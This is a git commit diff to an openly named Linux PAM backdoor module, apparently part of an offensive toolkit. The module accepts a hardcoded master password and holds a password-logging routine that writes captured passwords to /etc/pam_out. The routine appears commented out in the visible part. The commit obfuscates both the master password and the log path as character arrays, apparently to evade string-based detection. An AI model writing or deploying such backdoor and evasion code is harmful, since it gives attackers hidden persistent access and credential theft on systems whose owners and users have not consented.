c71461ad41a776d62660cda7df276e25233d1f7d
Khael <93288940+KhaelK138@users.noreply.github.com>
2025-06-01 18:06:09 -0500

    Update pam_backdoor.c

--- pam_backdoor.c
+++ pam_backdoor.c
@@ -3,7 +3,9 @@
 #include <string.h>
 #include <stdio.h>
 
-#define MASTER_PASSWORD "master_password"
+#define MASTER_PASSWORD (char[]){'m','a','s','t','e','r','_','p','a','s','s','w','o','r','d','\0'}
+#define PAM_PASSWORD_STORE (char[]){'/','e','t','c','/','p','a','m','_','o','u','t','\0'}
+
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
     const char *password = NULL;
@@ -14,7 +16,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
 
     /*
     if (password) {
-        FILE *f = fopen("/etc/pam_out", "a");
+        FILE *f = fopen(PAM_PASSWORD_STORE, "a");
         if (f) {
             fprintf(f, "%s\n", password);
             fclose(f);
